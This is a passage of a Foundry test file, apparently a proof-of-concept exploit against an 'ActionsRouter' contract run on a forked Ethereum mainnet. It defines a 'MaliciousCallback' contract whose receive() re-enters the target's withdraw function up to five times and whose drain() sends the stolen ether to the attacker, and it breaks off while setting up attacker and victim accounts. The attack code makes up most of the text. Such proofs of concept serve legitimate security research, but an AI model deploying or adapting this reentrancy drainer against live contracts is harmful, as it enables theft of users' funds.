 * @dev Run: forge test --fork-url $ETH_RPC_URL -vvvv
 */

// Minimal interface for target contract
interface IActionsRouter {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256) external;
}

// Malicious callback contract for reentrancy
contract MaliciousCallback {
    address public target;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= 0.1 ether) {
            attackCount++;
            // Try reentrancy
            (bool success,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 0.1 ether));
            if (!success) {
                // Alternative withdraw signature
                target.call(abi.encodeWithSignature("withdraw()"));
            }
        }
    }

    function attack() external payable {
        require(msg.sender == owner);
        (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
        target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }

    function drain() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

contract AGL_RealExploit_ActionsRouter is Test {

    // Attack parameters
    address attacker;
    address victim;
    uint256 attackerInitialBalance;
    uint256 victimInitialBalance;

    // Target contract
    address targetAddress;

    // Fork block (use recent block for accuracy)
    uint256 constant FORK_BLOCK = 19000000;

    function setUp() public {
        // Create test accounts
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Fund attacker
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 50 ether);

        attackerInitialBalance = attacker.balance;
        victimInitialBalance = victim.balance;

        // Log setup
